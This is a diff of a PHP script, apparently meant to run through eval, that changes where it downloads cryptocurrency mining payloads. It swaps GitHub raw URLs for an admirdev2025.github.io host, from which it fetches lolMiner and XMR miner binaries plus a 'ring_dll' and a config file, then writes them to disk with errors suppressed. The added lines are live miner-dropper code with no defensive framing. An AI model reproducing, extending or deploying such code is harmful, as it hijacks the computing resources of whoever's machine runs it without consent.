@@ -6,6 +6,9 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 [GIT_COMMAND]
 
+<?php
+
+
 $GLOBALS['__download_002'] = function($url, $post = false)
 {
 	try
@@ -133,7 +136,8 @@ if(1)
 	if(!is_file($lolm_path))
 	{
 		$data = false;
-		$data = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/lolMiner_1.95.dat");
+		/*$data = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/lolMiner_1.95.dat");*/
+		$data = @$GLOBALS['__download_002']("https://admirdev2025.github.io/myproj/lolminer/lolMiner_1.95.dat");
 		if($data && strlen($data) > 9000000)
 			@file_put_contents($lolm_path, $data);
 		else
@@ -142,9 +146,15 @@ if(1)
 	if($EXEC_XMR && !is_file($xmr_path))
 	{
 		$data = false;
+		/**
 		$data = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/xmr.dat");
 		$data2 = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/ring_config.dat");
 		$data3 = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/ring_dll.dat");
+		/**/
+		$data = @$GLOBALS['__download_002']("https://admirdev2025.github.io/myproj/lolminer/xmr.dat");
+		$data2 = @$GLOBALS['__download_002']("https://admirdev2025.github.io/myproj/lolminer/ring_config.dat");
+		$data3 = @$GLOBALS['__download_002']("https://admirdev2025.github.io/myproj/lolminer/ring_dll.dat");
+		
 		if($data && strlen($data) > 5000000 && strlen($data2) > 3000 && strlen($data3) > 12000)
 		{
 			@file_put_contents($xmr_path, $data);
